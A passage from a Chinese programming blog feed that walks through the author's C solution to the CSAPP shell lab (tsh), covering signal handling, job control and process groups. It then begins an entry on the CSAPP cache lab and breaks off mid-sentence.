    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/492645370">参考大佬</a></p><p>前情提要</p><ol><li>这个实验和之前的不太一样，最好要去把书看一遍，很多具体的实验的方法，思想，甚至是代码在书上已经给出了，自己很难想出来</li></ol><h1 id="实验总览"><a href="#实验总览" class="headerlink" title="实验总览"></a>实验总览</h1><ol><li>总共有16个trace，运行make test0x 与 make rtest0x，比较结果是否相同</li><li>实验内容<ul><li><code>eval</code>: Main routine that parses and interprets the command line. 70 lines </li><li><code>builtin cmd</code>: Recognizes and interprets the built-in commands: quit, fg, bg, and jobs. 25 lines</li><li><code>do bgfg</code>: Implements the bg and fg built-in commands. 50 lines</li><li><code>waitfg</code>: Waits for a foreground job to complete. 20 lines</li><li><code>sigchld handler</code>: Catches SIGCHILD signals. 80 lines</li><li><code>sigint handler</code>: Catches SIGINT (ctrl-c) signals. 15 lines</li><li><code>sigtstp handler</code>: Catches SIGTSTP (ctrl-z) signals. 15 lines</li></ul></li></ol><h1 id="什么是shell？"><a href="#什么是shell？" class="headerlink" title="什么是shell？"></a>什么是shell？</h1><p>shell通常用来指命令行，我们可以通过这个命令行去启动各种程序<br>那么，这个命令行是如何启动这些程序的呢？</p><ol><li>shell将自己作为父进程</li><li>shell创建一个子进程去启动各种程序<br>那么，shell其实也就是一个进程，也不过是一个比较特殊的程序，那它这个程序是什么样的呢？</li><li>不断地循环，并打印一个提示符，我们这个lab的提示符就是这样<code>tsh&gt;</code></li><li>然后通过fgets获得我们的输入，我们的输入通常就是程序的路径（名字）以及这个程序的参数</li><li>通过我们的输入去启动程序。这里就有两种程序了，一种是前台程序，一种是后台程序<ol><li>首先要明确一点，前台程序和后台程序没有本质上的区别，运行起来都是一个进程而已</li><li>前台进程比较特殊的一点就是，它会阻塞shell，一直到自己执行完了，然后让shell继续执行</li></ol></li></ol><h1 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h1><p>eval函数的功能其实类似于一个启动器</p><ol><li>获取我们输入的各种信息</li><li>按照我们的要求去创建子进程，操作父进程</li></ol><p>第一步，获取各种输入的信息，这个就比较简单了，因为已经提供了写好的<code>parseline</code>函数，我们只需要调用即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 首先根据cmdline，解析这一行命令。由于我们在解析的函数中修改了传入的cmdline，所以用了一个备份的buffer。</span><br><span class="hljs-comment">// 同时解析函数的返回值其实就代表了当前这个被命令行启动的进程是前天还是后台运行的</span><br><span class="hljs-comment">// 但是其实好像不备份也行，留坑！</span><br><span class="hljs-type">char</span> buffer[MAXLINE];<br><span class="hljs-built_in">strcpy</span>(buffer, cmdline);<br><span class="hljs-type">char</span> *argv[MAXARGS];<br><span class="hljs-type">int</span> is_bg = parseline(buffer, argv);<br><span class="hljs-comment">// 题目已经定义为bg和fg，所以按照题目意思来定义状态</span><br><span class="hljs-type">int</span> state = is_bg ? BG : FG;<br><span class="hljs-comment">// 如果解析出来是个空的命令行，则直接return</span><br><span class="hljs-keyword">if</span> (argv[<span class="hljs-number">0</span>] == <span class="hljs-literal">NULL</span>) &#123;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>第二步，就比较复杂了。<br>首先想一想，父进程需要做什么？</p><p>父进程</p><ol start="3"><li>创建子进程</li><li>为子进程创建一个对应的job</li><li>根据子进程的类型决定自己是否需要阻塞，等到子进程执行完毕<br>这里有两个注意点</li><li>创建子进程之前父进程需要阻塞掉<code>SIGCHLD</code>信号<ol><li>这个信号是子进程死亡后向父进程发出的信号</li><li>为什么要阻塞这个呢？<ol><li>如果刚创建好子进程，子进程就获得了cpu的使用权</li><li>然后子进程马上就执行完成，发出这个死亡的信号给父进程</li><li>父进程拿到cpu并且受到信号后就需要调用对应的处理函数，这个处理函数需要在job中删除对应项</li><li>但是因为刚创建好子进程之后父进程就没有用过cpu，父进程压根没来得及在job中为子进程创建对应项，所以这个删除操作肯定是失败的</li><li>等父进程拿到cpu之后，才给子进程注册了一个job，可是子进程早就结束了，也就是说父进程永远等不到这个子进程的死亡信号</li><li>因此这个job永远不会被删除</li></ol></li><li>因此在创建子进程之后需要阻塞这个信号，再父进程完成为子进程注册job之后，就可以解除这个阻塞</li></ol></li><li>操作job之前需要阻塞掉所有的信号<ol><li>这个是因为jobs是一个全局变量，为了防止并发的问题，必须要阻塞掉所以的信号，包括切换进程的信号</li><li>这个有点像操作系统的各种锁的作用，保护临界资源的<br>那么子进程需要干嘛呢？</li></ol></li><li>首先，子进程继承了父进程的所有资源，而父进程在创建它之前已经阻塞了SIGCHLD信号量，子进程最好先将这个接触，避免可能的问题</li><li>子进程需要修改自己的组号，刚被创建时是和父进程一个组的。之所以要和父进程不同组，是为了防止子进程收到某些信号影响到同属一个组的父进程，比如对子进程发出kill命令的时候，往往是对子进程所在的组发出kill命令，如果不修改子进程组号，会把父进程也就是shell给kill了。</li><li>根据命令行的输入，使用<code>execve</code>函数启动对应的程序</li><li>终止</li></ol><p>子进程这里需要注意一点，那就是用户输入的程序可能是不存在的，因此，对于execve函数的结果需要特殊处理一下</p><p>整个eval函数的实现如下，其中涉及了一些信号相关的操作比较陌生</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">eval</span><span class="hljs-params">(<span class="hljs-type">char</span> *cmdline)</span> &#123;<br>  <span class="hljs-comment">// 首先根据cmdline，解析这一行命令。由于我们在解析的函数中修改了传入的cmdline，所以用了一个备份的buffer。</span><br>  <span class="hljs-comment">// 同时解析函数的返回值其实就代表了当前这个被命令行启动的进程是前天还是后台运行的</span><br>  <span class="hljs-comment">// 但是其实好像不备份也行，留坑！</span><br>  <span class="hljs-type">char</span> buffer[MAXLINE];<br>  <span class="hljs-built_in">strcpy</span>(buffer, cmdline);<br>  <span class="hljs-type">char</span> *argv[MAXARGS];<br>  <span class="hljs-type">int</span> is_bg = parseline(buffer, argv);<br>  <span class="hljs-comment">// 题目已经定义为bg和fg，所以按照题目意思来定义状态</span><br>  <span class="hljs-type">int</span> state = is_bg ? BG : FG;<br>  <span class="hljs-comment">// 如果解析出来是个空的命令行，则直接return</span><br>  <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">0</span>] == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-comment">// 下面是核心操作部分</span><br>  <span class="hljs-comment">// 创建信号集并初始化，分别是不理会所有信号，不理会一个信号（SIGCHLD），和备份之前的信号</span><br>  <span class="hljs-type">sigset_t</span> all_mask, one_mask, pre_mask;<br>  sigfillset(&amp;all_mask);<br>  sigemptyset(&amp;one_mask);<br>  sigaddset(&amp;one_mask, SIGCHLD);<br>  <span class="hljs-comment">// 如果即将创建的进程不是系统程序，那下面这个函数会返回0</span><br>  <span class="hljs-comment">// 如果是系统程序，那这个函数内部就直接执行了， 不需要我们管了</span><br>  <span class="hljs-comment">// 因此，我们只需要处理非系统程序的情况</span><br>  <span class="hljs-type">pid_t</span> pid;<br>  <span class="hljs-keyword">if</span> (!builtin_cmd(argv)) &#123;<br>    <span class="hljs-comment">// 在调用fork之前就要阻塞SIGCHLD信号</span><br>    sigprocmask(SIG_BLOCK, &amp;one_mask, &amp;pre_mask);<br>    <span class="hljs-keyword">if</span> ((pid = fork()) == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-comment">// 子进程</span><br>      <span class="hljs-comment">// 子进程首先解除从父进程那继承来的阻塞信号</span><br>      sigprocmask(SIG_SETMASK, &amp;pre_mask, <span class="hljs-literal">NULL</span>);<br>      <span class="hljs-comment">// 修改自己的组id为自己的id</span><br>      setpgid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>      <span class="hljs-comment">// 创建真正的进程，其中environ是在libc文件中定义的</span><br>      Execve(argv[<span class="hljs-number">0</span>], argv, environ);<br>      <span class="hljs-comment">// 真正的进程执行完之后，子进程也就完成使命了，使用exit终止进程，更加强劲！</span><br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-comment">// 父进程继续操作</span><br>    <span class="hljs-comment">// 首先获取全局锁，因为要修改全局变量了</span><br>    sigprocmask(SIG_BLOCK, &amp;all_mask, <span class="hljs-literal">NULL</span>);<br>    addjob(jobs, pid, state, cmdline);<br>    sigprocmask(SIG_SETMASK, &amp;one_mask, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">// 如果是前台进程，则父进程要阻塞到这个前台进程结束</span><br>    <span class="hljs-comment">// 如果是后台进程，则父进程打印这个后台进程的信息</span><br>    <span class="hljs-keyword">if</span> (state == FG) &#123;<br>      waitfg(pid);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>, pid2jid(pid), pid, cmdline);<br>    &#125;<br>    <span class="hljs-comment">// 父进程ok了，可以去接受SIGCHLD信号</span><br>    sigprocmask(SIG_SETMASK, &amp;pre_mask, <span class="hljs-literal">NULL</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="builtin-cmd"><a href="#builtin-cmd" class="headerlink" title="builtin_cmd"></a>builtin_cmd</h1><p>这个函数就比较简单了，用来判断用户输入的是否是内置的程序</p><p>tsh中要求的内置程序只有<code>quit</code>，<code>bg</code>，<code>fg</code>，<code>jobs</code></p><p>这个实现没什么好说的，可能有点前置的知识那就是，argv这个变量，可以看做一个一维数组，其中</p><p>每个值都是一个字符串</p><ol><li>第一个字符串是程序的名字</li><li>后面的每个字符串都代表了一个参数</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">builtin_cmd</span><span class="hljs-params">(<span class="hljs-type">char</span> **argv)</span> &#123;<br>  <span class="hljs-comment">// 总共要处理 quit bg fg jobs，并&amp;</span><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;quit&quot;</span>)) &#123;<br>    <span class="hljs-comment">// quit指令，直接终止</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;bg&quot;</span>) || !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;fg&quot;</span>)) &#123;<br>    <span class="hljs-comment">// 执行bg或者fg</span><br>    do_bgfg(argv);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;jobs&quot;</span>)) &#123;<br>    <span class="hljs-comment">// 列出jobs</span><br>    listjobs(jobs);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="do-bgfg"><a href="#do-bgfg" class="headerlink" title="do_bgfg"></a>do_bgfg</h1><p><code>void do_bgfg(char **argv)</code></p><p>这个函数是要我们将某个job唤醒，或者由后台操作变成前台操作</p><ol><li>首先，我们需要知道到底是要变成前台还是后台，这个参数存在<code>argv[0]</code>中</li><li>然后我们需要拿出具体的pid或者jid，其中jid通过%起始以做区别。<ol><li>需要处理这个参数为空情况，即没有给出任何的pid或者jid。</li><li>需要处理输入的pid或者jid非法的情况</li></ol></li><li>通过具体的pid或者jid拿到对应的job，如果找不到这个job，说明不存在</li><li>给这个job发出一个<code>SIGCONT</code>的信号，不管它之前咋样，现在都醒过来</li><li>修改这个job的状态位前台或者后台</li><li>根据前台还是后台，决定当前进程是否需要等待<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">do_bgfg</span><span class="hljs-params">(<span class="hljs-type">char</span> **argv)</span> &#123;<br>  <span class="hljs-comment">// 后面要用到</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> *<span class="hljs-title">job</span> =</span> <span class="hljs-literal">NULL</span>;<br><br>  <span class="hljs-comment">// 这个函数需要处理多种输入，包括一些非法输入</span><br>  <span class="hljs-comment">// 首先是确认到底是bg操作还是fg操作</span><br>  <span class="hljs-type">int</span> state = (<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;bg&quot;</span>) == <span class="hljs-number">0</span>) ? BG : FG;<br><br>  <span class="hljs-comment">// 然后判断是否给出了具体的pid或者jid，如果没有给出正确的参数，那要给出提示</span><br>  <span class="hljs-comment">// 首先看看是否有参数</span><br>  <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>] == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-comment">// 有参数，那就先看看是不是jid</span><br>  <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;%&#x27;</span>) &#123;<br>    <span class="hljs-comment">// 使用sscanf尝试获取jid</span><br>    <span class="hljs-type">int</span> jid;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(&amp;argv[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;%d&quot;</span>, &amp;jid) &gt; <span class="hljs-number">0</span>) &#123;<br>      job = getjobjid(jobs, jid);<br>      <span class="hljs-comment">// 如果getjobjid返回null，则说明没有这个job</span><br>      <span class="hljs-keyword">if</span> (job == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%%%d: No such job\n&quot;</span>, jid);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-comment">// 到了这里，那肯定有参数，并且不是jid，但是也有可能是瞎输入的先排除一下</span><br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isdigit</span>(argv[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>])) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">return</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 肯定输入的是pid了</span><br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;%d&quot;</span>, &amp;pid) &gt; <span class="hljs-number">0</span>) &#123;<br>      job = getjobpid(jobs, pid);<br>      <span class="hljs-keyword">if</span> (job == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(%d): No such process\n&quot;</span>, pid);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-comment">// 如果能够走到这里，那么说明已经正确取到对应的job了</span><br>  <span class="hljs-comment">// 唤醒这个job，修改状态</span><br>  <span class="hljs-comment">// 这里没有使用进程组，留坑！</span><br>  kill(-job-&gt;pid, SIGCONT);<br>  job-&gt;state = state;<br>  <span class="hljs-comment">// 根据bg或者fg进行特定的操作</span><br>  <span class="hljs-keyword">if</span> (state == BG) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    waitfg(job-&gt;pid);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a>waitfg</h1><p><code>void waitfg(pid_t pid)</code></p><p>这个函数需要做到，当pid还是前台程序的时候，调用waitfg的程序一直休眠</p><p>首先，lab已经给我们提供了一个函数<code>fgpid</code>去检查是否还有程序是前台程序</p><ol><li>理论上，我们只需要不断地循环，如果发现还有程序是前台程序，那自己就sleep一下就可以了</li><li>但是这样的话，可能会很浪费时间，因为我们不知道到底要sleep多久</li></ol><p>所以，我们最好还是使用信号的机制，书上介绍了一个很牛逼的函数<code>sigsuspend</code></p><p>具体的优点书上已经详细介绍了，这里不赘述</p><p>这里就有个问题，正常来说，调用这个函数之前，进程应该是阻塞了<code>SIGCHLD</code>信号才对的</p><p>而我的实现里，有两处调用了这个函数，其中do_bgfg是没有阻塞上述的那个信号，但是也没有出现死锁，应该是测试数据太水了导致的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">waitfg</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid)</span> &#123;<br>  <span class="hljs-comment">// 注意，进入这个函数的时候，父进程已经阻塞了子进程可能传来的SIGCHLD信号</span><br>  <span class="hljs-comment">// 而我们使用的sigsuspend函数会让父进程进入一个完全没有阻塞信号的状态</span><br>  <span class="hljs-comment">// 因此，只要有一个子进程挂了，父进程就会跳出阻塞去检查一下是否还有前台进程</span><br>  <span class="hljs-comment">// 感觉有点问题，这里实现的好像太严格了，不只考虑了pid，还考虑所有前台进程，留坑</span><br>  <span class="hljs-type">sigset_t</span> none_mask;<br>  sigemptyset(&amp;none_mask);<br>  <span class="hljs-keyword">while</span> (fgpid(jobs) != pid) &#123;<br>    sigsuspend(&amp;none_mask);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="sigchld-handler"><a href="#sigchld-handler" class="headerlink" title="sigchld_handler"></a>sigchld_handler</h1><p>这个函数和<code>SIGCHLD</code>信号绑定了，只要有子进程发出这个信号，父进程接收到之后就会使用这个函数去响应</p><ol><li>首先，父进程会使用waitpid函数去看看是否有子进程挂了或者暂停</li><li>然后父进程会根据不同情况去处理<ol><li>子进程正常结束：删除对应的job</li><li>子进程被信号终止：删除对应的job，并打印信息</li><li>子进程被暂停：找到对应的job，修改job的状态为暂停，并打印信息</li></ol></li></ol><p>注意点<br>3. <code>WNOHANG | WUNTRACED</code><br>    1. 第一个参数保证了，就算没有需要处理的子进程，当前进程也不会阻塞住不动<br>    2. 第二个参数保证了，会去响应被暂停的子进程<br>4. 备份errno<br>5. 在修改jobs之前需要阻塞所有信号，作用和之前说的一样，防止并发带来的问题</p><blockquote><p>由于我们不知道到底有多少个死亡信号或者暂停信号到达，所以必须要用while，而不是if</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">sigchld_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span> &#123;<br>  <span class="hljs-type">int</span> olderr = errno;<br>  <span class="hljs-type">pid_t</span> pid;<br>  <span class="hljs-type">int</span> state;<br>  <span class="hljs-type">sigset_t</span> all_mask, pre_mask;<br>  sigfillset(&amp;all_mask);<br>  <span class="hljs-comment">// 不断等待子进程，直到收到一个子进程停止的消息</span><br>  <span class="hljs-keyword">while</span> ((pid = waitpid(<span class="hljs-number">-1</span>, &amp;state, WNOHANG | WUNTRACED)) &gt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-comment">// 因为接下来需要操作jobs这个全局变量，先屏蔽所有的信号</span><br>    sigprocmask(SIG_SETMASK, &amp;all_mask, &amp;pre_mask);<br>    <span class="hljs-comment">// 如果是正常终止，则只需要删除对应的job</span><br>    <span class="hljs-keyword">if</span> (WIFEXITED(state)) &#123;<br>      deletejob(jobs, pid);<br>      <span class="hljs-comment">// 如果是被信号杀死，则还需要输出被哪个信号杀死</span><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (WIFSIGNALED(state)) &#123;<br>      deletejob(jobs, pid);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, pid2jid(pid), pid,<br>             WTERMSIG(state));<br>      <span class="hljs-comment">// 如果是被信号暂停了，还需要修改对应job的状态</span><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (WIFSTOPPED(state)) &#123;<br>      <span class="hljs-keyword">struct</span> <span class="hljs-type">job_t</span> *job = getjobpid(jobs, pid);<br>      job-&gt;state = ST;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Job [%d] (%d) stoped by signal %d\n&quot;</span>, pid2jid(pid), pid,<br>             WSTOPSIG(state));<br>    &#125;<br>    sigprocmask(SIG_SETMASK, &amp;pre_mask, <span class="hljs-literal">NULL</span>);<br>  &#125;<br><br>  errno = olderr;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="sigint-handler"><a href="#sigint-handler" class="headerlink" title="sigint_handler"></a>sigint_handler</h1><p>这个函数对应于ctrl c操作，强制杀死前台的进程<br>实现起来很简单：找到当前的前台进程，然后通过kill函数杀死它<br>注意保存和恢复error</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">sigint_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span> &#123;<br>  <span class="hljs-comment">// 前台进程只可能有一个，只要还存在前台进程，那就把这个前台进程给杀掉</span><br>  <span class="hljs-comment">// 感觉这里不加信号量也没问题</span><br>  <span class="hljs-type">int</span> olderr = errno;<br>  <span class="hljs-type">pid_t</span> pid;<br>  <span class="hljs-keyword">if</span> ((pid = fgpid(jobs)) != <span class="hljs-number">0</span>) &#123;<br>    kill(pid, sig);<br>  &#125;<br>  errno = olderr;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="sigtstp-handler"><a href="#sigtstp-handler" class="headerlink" title="sigtstp_handler"></a>sigtstp_handler</h1><p>这个函数对应于ctrl z函数，暂停前台进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> olderr = errno;<br><span class="hljs-type">pid_t</span> pid;<br><span class="hljs-keyword">if</span> ((pid = fgpid(jobs)) != <span class="hljs-number">0</span>) &#123;<br>  kill(pid, sig);<br>&#125;<br>errno = olderr;<br></code></pre></td></tr></table></figure><h1 id="留坑"><a href="#留坑" class="headerlink" title="留坑"></a>留坑</h1><ol><li>至今没有搞清楚tsh运行起来之后，到底是咋实现换行的</li><li>总感觉这个做的迷迷糊糊的，没有很理解。接下来把书看一遍，希望能完全弄懂。</li></ol>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp_lab4</title>
    <link href="/2023/08/01/csapp-lab4/"/>
    <url>/2023/08/01/csapp-lab4/</url>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><ol><li>修改<code>csim.c</code>实现一个cache，<code>make</code>然后<code>./test-csim</code>测试是否正确</li><li>修改<code>trans.c</code>实现一个转置操作，并优化性能，测试方法如下<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">make &amp;&amp; ./test-trans -M 32 -N 32   <br>make &amp;&amp; ./test-trans -M 64 -N 64  <br>make &amp;&amp; ./test-trans -M 61 -N 67 <br></code></pre></td></tr></table></figure></li></ol><h1 id="模拟cache"><a href="#模拟cache" class="headerlink" title="模拟cache"></a>模拟cache</h1><p>首先，这个实验就是要求我们能够得出在一系列操作之下，命中次数，不命中次数，淘汰页面的次数。</p><h2 id="cacheline的定义"><a href="#cacheline的定义" class="headerlink" title="cacheline的定义"></a>cacheline的定义</h2><p>这个模拟cache的功能非常简单，因为不需要我们真正的去读写数据，只需要模拟进出cache的情况就可以了。因此，我们每个cache行，只需要像下面这样定义即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-type">int</span> valid;<br>  <span class="hljs-type">int</span> tag;<br>  <span class="hljs-type">int</span> time_stamp;<br>&#125; cache_line;<br></code></pre></td></tr></table></figure><h2 id="cache的操作"><a href="#cache的操作" class="headerlink" title="cache的操作"></a>cache的操作</h2><p>然后我们需要支持三种操作，分别是load，store和modify</p><ol><li>load的意思很明显，就是先去cache中检查， 